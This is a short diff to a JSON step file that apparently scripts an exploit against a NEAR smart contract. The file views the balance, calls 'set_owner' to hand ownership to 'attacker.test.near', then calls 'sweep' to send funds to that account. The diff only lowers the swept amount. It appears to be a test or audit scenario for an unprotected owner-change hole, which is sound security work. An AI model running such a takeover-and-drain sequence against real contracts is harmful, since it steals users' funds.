@@ -2,6 +2,6 @@
   "steps": [
     { "kind": "view", "method": "available" },
     { "kind": "call", "method": "set_owner", "args": { "new_owner": "attacker.test.near" }, "gas_tgas": 30 },
-    { "kind": "call", "method": "sweep", "args": { "to": "attacker.test.near", "amount": "3000000000000000000000000" }, "gas_tgas": 30 }
+    { "kind": "call", "method": "sweep", "args": { "to": "attacker.test.near", "amount": "2500000000000000000000000" }, "gas_tgas": 30 }
   ]
 }
